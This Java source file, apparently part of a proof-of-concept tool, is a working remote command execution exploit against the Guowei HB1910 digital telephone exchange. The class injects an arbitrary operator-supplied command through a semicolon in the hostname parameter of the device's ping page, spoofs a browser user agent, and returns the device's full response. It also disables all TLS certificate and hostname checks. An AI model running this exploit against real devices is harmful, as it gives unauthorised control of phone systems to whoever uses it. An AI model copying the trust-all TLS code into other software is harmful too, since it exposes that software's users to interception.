package com.httprequest.gui.POC;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;

public class GuoweiHB1910RCE {
    // 创建一个信任所有证书的SSL上下文
    public static SSLContext createAllTrustingSSLContext() throws NoSuchAlgorithmException, KeyManagementException {
        TrustManager[] trustAllCerts = new TrustManager[] {
            new X509TrustManager() {
                public X509Certificate[] getAcceptedIssuers() {
                    return null;
                }
                public void checkClientTrusted(X509Certificate[] certs, String authType) {
                }
                public void checkServerTrusted(X509Certificate[] certs, String authType) {
                }
            }
        };
        
        SSLContext sc = SSLContext.getInstance("SSL");
        sc.init(null, trustAllCerts, new java.security.SecureRandom());
        return sc;
    }
    
    // 发送国威HB1910数字程控电话交换机RCE请求并返回响应
    public static String sendRCEAndGetResponse(String baseUrl, String command) throws Exception {
        String requestUrl = baseUrl;
        String requestMethod = "GET";
        
        // 对命令进行URL编码
        String encodedCommand = java.net.URLEncoder.encode(command, "UTF-8");
        requestUrl = baseUrl + "/modules/ping/generate.php?send=Ping&hostname=;" + encodedCommand;
        
        URL url = new URL(requestUrl);
        HttpURLConnection connection;
        
        // 如果是HTTPS连接，设置信任所有证书的SSL上下文
        if ("https".equals(url.getProtocol().toLowerCase())) {
            HttpsURLConnection httpsConnection = (HttpsURLConnection) url.openConnection();
            httpsConnection.setSSLSocketFactory(createAllTrustingSSLContext().getSocketFactory());
            httpsConnection.setHostnameVerifier(new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            });
            connection = httpsConnection;
        } else {
            connection = (HttpURLConnection) url.openConnection();
        }
        
        connection.setRequestMethod(requestMethod);
        connection.setRequestProperty("Host", url.getHost());
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0");
        connection.setRequestProperty("Accept", "*/*");
        connection.setRequestProperty("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2");
        connection.setRequestProperty("Accept-Encoding", "gzip, deflate, br");
        connection.setRequestProperty("Connection", "keep-alive");
        
        // 设置连接和读取超时为20秒
        connection.setConnectTimeout(20000);
        connection.setReadTimeout(20000);

        // 构建请求详情
        StringBuilder requestDetails = new StringBuilder();
        // 添加原始请求头
        requestDetails.append("原始请求头:\n");
        requestDetails.append("GET ").append(url.getFile()).append(" HTTP/1.1\n");
        requestDetails.append("Host: ").append(url.getHost()).append("\n");
        requestDetails.append("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0\n");
        requestDetails.append("Accept: */*\n");
        requestDetails.append("Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n");
        requestDetails.append("Accept-Encoding: gzip, deflate, br\n");
        requestDetails.append("Connection: keep-alive\n\n");

        int responseCode = connection.getResponseCode();
        StringBuilder response = new StringBuilder();
        response.append("响应状态码: " ).append(responseCode).append("\n\n");
        
        // 获取响应头
        response.append("响应头:\n");
        for (int i = 0; ; i++) {
            String key = connection.getHeaderFieldKey(i);
            String value = connection.getHeaderField(i);
            if (key == null && value == null) {
                break;
            }
            response.append(key != null ? key : "Status").append(": " ).append(value).append("\n");
        }
        
        response.append("\n响应体:\n");
        
        // 流式读取响应体并实时显示
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), "UTF-8"))) {
            String line;
            while ((line = reader.readLine()) != null) {
                response.append(line).append("\n");
            }
        }

        // 返回请求详情和响应详情
        return "请求详情:\n" + requestDetails.toString() + "\n响应详情:\n" + response.toString();
    }
}